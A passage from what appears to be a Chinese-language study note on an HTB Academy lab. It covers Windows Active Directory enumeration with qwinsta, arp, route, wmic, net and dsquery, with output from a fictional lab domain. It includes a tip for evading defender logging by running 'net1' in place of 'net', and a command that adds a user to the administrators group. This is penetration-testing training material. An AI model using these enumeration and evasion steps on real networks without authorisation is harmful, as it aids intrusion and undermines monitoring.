FDA97E38<span class="hljs-literal">-1666-4534-98D4-943A9A871482</span><br>ComputerState                    : <span class="hljs-number">0</span><br>DefenderSignaturesOutOfDate      : False<br>DeviceControlDefaultEnforcement  : Unknown<br>DeviceControlPoliciesLastUpdated : <span class="hljs-number">3</span>/<span class="hljs-number">20</span>/<span class="hljs-number">2022</span> <span class="hljs-number">9</span>:<span class="hljs-number">08</span>:<span class="hljs-number">34</span> PM<br>DeviceControlState               : Disabled<br>FullScanAge                      : <span class="hljs-number">4294967295</span><br>FullScanEndTime                  :<br>FullScanOverdue                  : False<br>FullScanRequired                 : False<br>FullScanSignatureVersion         :<br>FullScanStartTime                :<br>IoavProtectionEnabled            : True<br>IsTamperProtected                : True<br>IsVirtualMachine                 : False<br>LastFullScanSource               : <span class="hljs-number">0</span><br>LastQuickScanSource              : <span class="hljs-number">2</span><br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<h2 id="Am-I-Alone"><a href="#Am-I-Alone" class="headerlink" title="Am I Alone?"></a>Am I Alone?</h2><h3 id="使用-qwinsta"><a href="#使用-qwinsta" class="headerlink" title="使用 qwinsta"></a>使用 qwinsta</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; qwinsta<br><br> SESSIONNAME       USERNAME                 ID  STATE   <span class="hljs-built_in">TYPE</span>        DEVICE<br> services                                    <span class="hljs-number">0</span>  Disc<br>&gt;console           forend                    <span class="hljs-number">1</span>  Active<br> rdp<span class="hljs-literal">-tcp</span>                                 <span class="hljs-number">65536</span>  Listen<br></code></pre></td></tr></table></figure>

<h2 id="网络信息"><a href="#网络信息" class="headerlink" title="网络信息"></a>网络信息</h2><table>
<thead>
<tr>
<th><strong>网络命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>arp -a</code></td>
<td>列出 ARP 表中存储的所有已知主机。</td>
</tr>
<tr>
<td><code>ipconfig /all</code></td>
<td>输出主机的适配器设置。我们可以从中确定网络段。</td>
</tr>
<tr>
<td><code>route print</code></td>
<td>显示路由表（IPv4 和 IPv6），识别已知网络及与主机共享的三层路由。</td>
</tr>
<tr>
<td><code>netsh advfirewall show allprofiles</code></td>
<td>显示主机防火墙的状态。我们可以确定它是否处于活动状态并过滤流量。</td>
</tr>
</tbody></table>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; arp <span class="hljs-literal">-a</span><br><br>Interface: <span class="hljs-number">172.16</span>.<span class="hljs-number">5.25</span> <span class="hljs-literal">---</span> <span class="hljs-number">0</span>x8<br>  Internet Address      Physical Address      <span class="hljs-built_in">Type</span><br>  <span class="hljs-number">172.16</span>.<span class="hljs-number">5.5</span>            <span class="hljs-number">00</span><span class="hljs-literal">-50-56-b9-08-26</span>     dynamic<br>  <span class="hljs-number">172.16</span>.<span class="hljs-number">5.130</span>          <span class="hljs-number">00</span><span class="hljs-literal">-50-56-b9-f0-e1</span>     dynamic<br>  <span class="hljs-number">172.16</span>.<span class="hljs-number">5.240</span>          <span class="hljs-number">00</span><span class="hljs-literal">-50-56-b9-9d-66</span>     dynamic<br>  <span class="hljs-number">224.0</span>.<span class="hljs-number">0.22</span>            <span class="hljs-number">01</span><span class="hljs-literal">-00-5e-00-00-16</span>     <span class="hljs-keyword">static</span><br>  <span class="hljs-number">224.0</span>.<span class="hljs-number">0.251</span>           <span class="hljs-number">01</span><span class="hljs-literal">-00-5e-00-00-fb</span>     <span class="hljs-keyword">static</span><br>  <span class="hljs-number">224.0</span>.<span class="hljs-number">0.252</span>           <span class="hljs-number">01</span><span class="hljs-literal">-00-5e-00-00-fc</span>     <span class="hljs-keyword">static</span><br>  <span class="hljs-number">239.255</span>.<span class="hljs-number">255.250</span>       <span class="hljs-number">01</span><span class="hljs-literal">-00-5e-7f-ff-fa</span>     <span class="hljs-keyword">static</span><br><br>Interface: <span class="hljs-number">10.129</span>.<span class="hljs-number">201.234</span> <span class="hljs-literal">---</span> <span class="hljs-number">0</span>xc<br>  Internet Address      Physical Address      <span class="hljs-built_in">Type</span><br>  <span class="hljs-number">10.129</span>.<span class="hljs-number">0.1</span>            <span class="hljs-number">00</span><span class="hljs-literal">-50-56-b9-b9-fc</span>     dynamic<br>  <span class="hljs-number">10.129</span>.<span class="hljs-number">202.29</span>         <span class="hljs-number">00</span><span class="hljs-literal">-50-56-b9-26-8d</span>     dynamic<br>  <span class="hljs-number">10.129</span>.<span class="hljs-number">255.255</span>        ff<span class="hljs-literal">-ff-ff-ff-ff-ff</span>     <span class="hljs-keyword">static</span><br>  <span class="hljs-number">224.0</span>.<span class="hljs-number">0.22</span>            <span class="hljs-number">01</span><span class="hljs-literal">-00-5e-00-00-16</span>     <span class="hljs-keyword">static</span><br>  <span class="hljs-number">224.0</span>.<span class="hljs-number">0.251</span>           <span class="hljs-number">01</span><span class="hljs-literal">-00-5e-00-00-fb</span>     <span class="hljs-keyword">static</span><br>  <span class="hljs-number">224.0</span>.<span class="hljs-number">0.252</span>           <span class="hljs-number">01</span><span class="hljs-literal">-00-5e-00-00-fc</span>     <span class="hljs-keyword">static</span><br>  <span class="hljs-number">239.255</span>.<span class="hljs-number">255.250</span>       <span class="hljs-number">01</span><span class="hljs-literal">-00-5e-7f-ff-fa</span>     <span class="hljs-keyword">static</span><br>  <span class="hljs-number">255.255</span>.<span class="hljs-number">255.255</span>       ff<span class="hljs-literal">-ff-ff-ff-ff-ff</span>     <span class="hljs-keyword">static</span><br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; route print<br><br>===========================================================================<br>Interface List<br>  <span class="hljs-number">8</span>...<span class="hljs-number">00</span> <span class="hljs-number">50</span> <span class="hljs-number">56</span> b9 <span class="hljs-number">9</span>d d9 ......vmxnet3 Ethernet Adapter <span class="hljs-comment">#2</span><br> <span class="hljs-number">12</span>...<span class="hljs-number">00</span> <span class="hljs-number">50</span> <span class="hljs-number">56</span> b9 de <span class="hljs-number">92</span> ......vmxnet3 Ethernet Adapter<br>  <span class="hljs-number">1</span>...........................Software Loopback Interface <span class="hljs-number">1</span><br>===========================================================================<br><br>IPv4 Route Table<br>===========================================================================<br>Active Routes:<br>Network Destination        Netmask          Gateway       Interface  Metric<br>          <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>          <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>       <span class="hljs-number">172.16</span>.<span class="hljs-number">5.1</span>      <span class="hljs-number">172.16</span>.<span class="hljs-number">5.25</span>    <span class="hljs-number">261</span><br>          <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>          <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>       <span class="hljs-number">10.129</span>.<span class="hljs-number">0.1</span>   <span class="hljs-number">10.129</span>.<span class="hljs-number">201.234</span>     <span class="hljs-number">20</span><br>       <span class="hljs-number">10.129</span>.<span class="hljs-number">0.0</span>      <span class="hljs-number">255.255</span>.<span class="hljs-number">0.0</span>         On<span class="hljs-literal">-link</span>    <span class="hljs-number">10.129</span>.<span class="hljs-number">201.234</span>    <span class="hljs-number">266</span><br>   <span class="hljs-number">10.129</span>.<span class="hljs-number">201.234</span>  <span class="hljs-number">255.255</span>.<span class="hljs-number">255.255</span>         On<span class="hljs-literal">-link</span>    <span class="hljs-number">10.129</span>.<span class="hljs-number">201.234</span>    <span class="hljs-number">266</span><br>   <span class="hljs-number">10.129</span>.<span class="hljs-number">255.255</span>  <span class="hljs-number">255.255</span>.<span class="hljs-number">255.255</span>         On<span class="hljs-literal">-link</span>    <span class="hljs-number">10.129</span>.<span class="hljs-number">201.234</span>    <span class="hljs-number">266</span><br>        <span class="hljs-number">127.0</span>.<span class="hljs-number">0.0</span>        <span class="hljs-number">255.0</span>.<span class="hljs-number">0.0</span>         On<span class="hljs-literal">-link</span>         <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>    <span class="hljs-number">331</span><br>        <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>  <span class="hljs-number">255.255</span>.<span class="hljs-number">255.255</span>         On<span class="hljs-literal">-link</span>         <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>    <span class="hljs-number">331</span><br>  <span class="hljs-number">127.255</span>.<span class="hljs-number">255.255</span>  <span class="hljs-number">255.255</span>.<span class="hljs-number">255.255</span>         On<span class="hljs-literal">-link</span>         <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>    <span class="hljs-number">331</span><br>       <span class="hljs-number">172.16</span>.<span class="hljs-number">4.0</span>    <span class="hljs-number">255.255</span>.<span class="hljs-number">254.0</span>         On<span class="hljs-literal">-link</span>       <span class="hljs-number">172.16</span>.<span class="hljs-number">5.25</span>    <span class="hljs-number">261</span><br>      <span class="hljs-number">172.16</span>.<span class="hljs-number">5.25</span>  <span class="hljs-number">255.255</span>.<span class="hljs-number">255.255</span>         On<span class="hljs-literal">-link</span>       <span class="hljs-number">172.16</span>.<span class="hljs-number">5.25</span>    <span class="hljs-number">261</span><br>     <span class="hljs-number">172.16</span>.<span class="hljs-number">5.255</span>  <span class="hljs-number">255.255</span>.<span class="hljs-number">255.255</span>         On<span class="hljs-literal">-link</span>       <span class="hljs-number">172.16</span>.<span class="hljs-number">5.25</span>    <span class="hljs-number">261</span><br>        <span class="hljs-number">224.0</span>.<span class="hljs-number">0.0</span>        <span class="hljs-number">240.0</span>.<span class="hljs-number">0.0</span>         On<span class="hljs-literal">-link</span>         <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>    <span class="hljs-number">331</span><br>        <span class="hljs-number">224.0</span>.<span class="hljs-number">0.0</span>        <span class="hljs-number">240.0</span>.<span class="hljs-number">0.0</span>         On<span class="hljs-literal">-link</span>    <span class="hljs-number">10.129</span>.<span class="hljs-number">201.234</span>    <span class="hljs-number">266</span><br>        <span class="hljs-number">224.0</span>.<span class="hljs-number">0.0</span>        <span class="hljs-number">240.0</span>.<span class="hljs-number">0.0</span>         On<span class="hljs-literal">-link</span>       <span class="hljs-number">172.16</span>.<span class="hljs-number">5.25</span>    <span class="hljs-number">261</span><br>  <span class="hljs-number">255.255</span>.<span class="hljs-number">255.255</span>  <span class="hljs-number">255.255</span>.<span class="hljs-number">255.255</span>         On<span class="hljs-literal">-link</span>         <span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>    <span class="hljs-number">331</span><br>  <span class="hljs-number">255.255</span>.<span class="hljs-number">255.255</span>  <span class="hljs-number">255.255</span>.<span class="hljs-number">255.255</span>         On<span class="hljs-literal">-link</span>    <span class="hljs-number">10.129</span>.<span class="hljs-number">201.234</span>    <span class="hljs-number">266</span><br>  <span class="hljs-number">255.255</span>.<span class="hljs-number">255.255</span>  <span class="hljs-number">255.255</span>.<span class="hljs-number">255.255</span>         On<span class="hljs-literal">-link</span>       <span class="hljs-number">172.16</span>.<span class="hljs-number">5.25</span>    <span class="hljs-number">261</span><br>  ===========================================================================<br>Persistent Routes:<br>  Network Address          Netmask  Gateway Address  Metric<br>          <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>          <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span>       <span class="hljs-number">172.16</span>.<span class="hljs-number">5.1</span>  Default<br>===========================================================================<br><br>IPv6 Route Table<br>===========================================================================<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<h2 id="Windows-管理规范-WMI"><a href="#Windows-管理规范-WMI" class="headerlink" title="Windows 管理规范 (WMI)"></a>Windows 管理规范 (WMI)</h2><table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>wmic qfe get Caption,Description,HotFixID,InstalledOn</code></td>
<td>打印已应用的热修复补丁级别和描述</td>
</tr>
<tr>
<td><code>wmic computersystem get Name,Domain,Manufacturer,Model,Username,Roles /format:List</code></td>
<td>显示基本主机信息，包括列表中的任何属性</td>
</tr>
<tr>
<td><code>wmic process list /format:list</code></td>
<td>主机上所有进程的列表</td>
</tr>
<tr>
<td><code>wmic ntdomain list /format:list</code></td>
<td>显示有关域和域控制器的信息</td>
</tr>
<tr>
<td><code>wmic useraccount list /format:list</code></td>
<td>显示有关所有本地账户以及已登录该设备的域账户的信息</td>
</tr>
<tr>
<td><code>wmic group list /format:list</code></td>
<td>所有本地组的信息</td>
</tr>
<tr>
<td><code>wmic sysaccount list /format:list</code></td>
<td>转储有关作为服务帐户使用的任何系统帐户的信息。</td>
</tr>
</tbody></table>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress<br><br>Caption          Description      DnsForestName           DomainControllerAddress  DomainName<br>ACADEMY<span class="hljs-literal">-EA-MS01</span>  ACADEMY<span class="hljs-literal">-EA-MS01</span><br>INLANEFREIGHT    INLANEFREIGHT    INLANEFREIGHT.LOCAL     \\<span class="hljs-number">172.16</span>.<span class="hljs-number">5.5</span>             INLANEFREIGHT<br>LOGISTICS        LOGISTICS        INLANEFREIGHT.LOCAL     \\<span class="hljs-number">172.16</span>.<span class="hljs-number">5.240</span>           LOGISTICS<br>FREIGHTLOGISTIC  FREIGHTLOGISTIC  FREIGHTLOGISTICS.LOCAL  \\<span class="hljs-number">172.16</span>.<span class="hljs-number">5.238</span>           FREIGHTLOGISTIC<br></code></pre></td></tr></table></figure>

<h2 id="Net-Commands"><a href="#Net-Commands" class="headerlink" title="Net Commands"></a>Net Commands</h2><table>
<thead>
<tr>
<th><strong>命令</strong></th>
<th><strong>描述</strong></th>
</tr>
</thead>
<tbody><tr>
<td><code>net accounts</code></td>
<td>密码要求相关信息</td>
</tr>
<tr>
<td><code>net accounts /domain</code></td>
<td>密码与锁定策略</td>
</tr>
<tr>
<td><code>net group /domain</code></td>
<td>域组信息</td>
</tr>
<tr>
<td><code>net group &quot;Domain Admins&quot; /domain</code></td>
<td>列出具有域管理员权限的用户</td>
</tr>
<tr>
<td><code>net group &quot;domain computers&quot; /domain</code></td>
<td>连接到域的电脑列表</td>
</tr>
<tr>
<td><code>net group &quot;Domain Controllers&quot; /domain</code></td>
<td>列出域控制器的 PC 账户</td>
</tr>
<tr>
<td><code>net group &lt;domain_group_name&gt; /domain</code></td>
<td>属于该组的用户</td>
</tr>
<tr>
<td><code>net groups /domain</code></td>
<td>域组列表</td>
</tr>
<tr>
<td><code>net localgroup</code></td>
<td>所有可用组</td>
</tr>
<tr>
<td><code>net localgroup administrators /domain</code></td>
<td>列出域内属于管理员组的用户（默认包含组 <code>Domain Admins</code> ）</td>
</tr>
<tr>
<td><code>net localgroup Administrators</code></td>
<td>关于一个组（管理员）的信息</td>
</tr>
<tr>
<td><code>net localgroup administrators [username] /add</code></td>
<td>将用户添加到管理员组</td>
</tr>
<tr>
<td><code>net share</code></td>
<td>检查当前共享</td>
</tr>
<tr>
<td><code>net user &lt;ACCOUNT_NAME&gt; /domain</code></td>
<td>获取域内用户信息</td>
</tr>
<tr>
<td><code>net user /domain</code></td>
<td>列出域中的所有用户</td>
</tr>
<tr>
<td><code>net user %username%</code></td>
<td>当前用户的信息</td>
</tr>
<tr>
<td><code>net use x: \computer\share</code></td>
<td>本地挂载共享</td>
</tr>
<tr>
<td><code>net view</code></td>
<td>获取计算机列表</td>
</tr>
<tr>
<td><code>net view /all /domain[:domainname]</code></td>
<td>域中的共享</td>
</tr>
<tr>
<td><code>net view \computer /ALL</code></td>
<td>列出计算机的共享资源</td>
</tr>
<tr>
<td><code>net view /domain</code></td>
<td>域内计算机列表</td>
</tr>
</tbody></table>
<h3 id="列出域组"><a href="#列出域组" class="headerlink" title="列出域组"></a>列出域组</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; net <span class="hljs-built_in">group</span> /domain<br><br>The request will be processed at a domain controller <span class="hljs-keyword">for</span> domain INLANEFREIGHT.LOCAL.<br><br><span class="hljs-built_in">Group</span> Accounts <span class="hljs-keyword">for</span> \\ACADEMY<span class="hljs-literal">-EA-DC01</span>.INLANEFREIGHT.LOCAL<br><span class="hljs-literal">-------------------------------------------------------------------------------</span><br>*<span class="hljs-variable">$H25000</span><span class="hljs-literal">-1RTRKC5S507F</span><br>*Accounting<br>*Barracuda_all_access<br>*Barracuda_facebook_access<br>*Barracuda_parked_sites<br>*Barracuda_youtube_exempt<br>*Billing<br>*Billing_users<br>*Calendar Access<br>*CEO<br>*CFO<br>*Cloneable Domain Controllers<br>*Collaboration_users<br>*Communications_users<br>*Compliance Management<br>*Computer <span class="hljs-built_in">Group</span> Management<br>*Contractors<br>*CTO<br><br>&lt;SNIP&gt;<br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; net user /domain wrouse<br><br>The request will be processed at a domain controller <span class="hljs-keyword">for</span> domain INLANEFREIGHT.LOCAL.<br><br>User name                    wrouse<br>Full Name                    Christopher Davis<br>Comment<br>User<span class="hljs-string">&#x27;s comment</span><br><span class="hljs-string">Country/region code          000 (System Default)</span><br><span class="hljs-string">Account active               Yes</span><br><span class="hljs-string">Account expires              Never</span><br><span class="hljs-string"></span><br><span class="hljs-string">Password last set            10/27/2021 10:38:01 AM</span><br><span class="hljs-string">Password expires             Never</span><br><span class="hljs-string">Password changeable          10/28/2021 10:38:01 AM</span><br><span class="hljs-string">Password required            Yes</span><br><span class="hljs-string">User may change password     Yes</span><br><span class="hljs-string"></span><br><span class="hljs-string">Workstations allowed         All</span><br><span class="hljs-string">Logon script</span><br><span class="hljs-string">User profile</span><br><span class="hljs-string">Home directory</span><br><span class="hljs-string">Last logon                   Never</span><br><span class="hljs-string"></span><br><span class="hljs-string">Logon hours allowed          All</span><br><span class="hljs-string"></span><br><span class="hljs-string">Local Group Memberships</span><br><span class="hljs-string">Global Group memberships     *File Share G Drive   *File Share H Drive</span><br><span class="hljs-string">                             *Warehouse            *Printer Access</span><br><span class="hljs-string">                             *Domain Users         *VPN Users</span><br><span class="hljs-string">                             *Shared Calendar Read</span><br><span class="hljs-string">The command completed successfully.</span><br></code></pre></td></tr></table></figure>

<h3 id="Net-Command技巧"><a href="#Net-Command技巧" class="headerlink" title="Net Command技巧"></a>Net Command技巧</h3><p>如果你认为网络防御者正在积极记录&#x2F;寻找任何异常的命令，你可以尝试这个变通方法来使用网络命令。输入 <code>net1</code> 而不是 <code>net</code> 将执行相同的功能，而不会触发来自网络字符串的潜在警报。</p>
<h2 id="Dsquery-用户-计算机搜索"><a href="#Dsquery-用户-计算机搜索" class="headerlink" title="Dsquery 用户&#x2F;计算机搜索"></a>Dsquery 用户&#x2F;计算机搜索</h2><p>我们所需要的只是在主机上提升的权限或从 <code>SYSTEM</code> 上下文中运行命令提示符或 PowerShell 实例的能力。</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; dsquery user<br><br><span class="hljs-string">&quot;CN=Administrator,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Guest,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=lab_adm,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=krbtgt,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Htb Student,CN=Users,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Annie Vazquez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Paul Falcon,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Fae Anthony,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Walter Dillard,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Louis Bradford,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Sonya Gage,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Alba Sanchez,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Daniel Branch,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Christopher Cruz,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Nicole Johnson,OU=Finance,OU=Financial-LON,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Mary Holliday,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Michael Shoemaker,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Arlene Slater,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=Kelsey Prentiss,OU=Human Resources,OU=HQ-NYC,OU=Employees,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br></code></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs powershell"><span class="hljs-built_in">PS</span> C:\htb&gt; dsquery computer<br><br><span class="hljs-string">&quot;CN=ACADEMY-EA-DC01,OU=Domain Controllers,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=ACADEMY-EA-MS01,OU=Web Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=ACADEMY-EA-MX01,OU=Mail,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=SQL01,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=ILF-XRG,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=MAINLON,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=CISERVER,OU=Critical,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=INDEX-DEV-LON,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=SQL-0253,OU=SQL Servers,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=NYC-0615,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=NYC-0616,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=NYC-0617,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=NYC-0618,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=NYC-0619,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=NYC-0620,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=NYC-0621,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=NYC-0622,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=NYC-0623,OU=NYC,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span class="hljs-string">&quot;CN=LON-0455,OU=LON,OU=Servers,OU=Computers,OU=Corp,DC=INLANEFREIGHT,DC=LOCAL&quot;</span><br><span 